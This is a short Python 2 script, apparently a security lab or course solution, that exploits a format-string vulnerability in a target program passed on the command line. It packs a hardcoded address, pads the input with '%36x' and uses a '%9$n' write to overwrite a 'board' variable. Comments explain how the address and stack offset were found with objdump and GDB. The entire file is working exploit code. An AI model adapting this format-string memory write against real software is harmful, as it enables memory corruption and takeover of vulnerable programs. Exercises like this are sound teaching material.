#!/usr/bin/env python2

import struct

import subprocess
import sys
import os

def main(program):
     
    input = ''
    # the address of board[5] can be found using objdump -t command
    address = struct.pack("I", 0x080499b5)
    # we found using GDB that our input address is found on the 9th 
    # position on the stack. Found that using "%x ..." as input, leaking stack 
    # contents. 
    element_nine = "%9$n"
    # prepare the injection input including alignment. 
    # we want to change "board1" to "board2"
    input += "   " + address + "%36x" + element_nine
    msg = 'hacked'
    subprocess.Popen(["env", "-i", program, input, msg])

if __name__ == "__main__":
    main(sys.argv[1])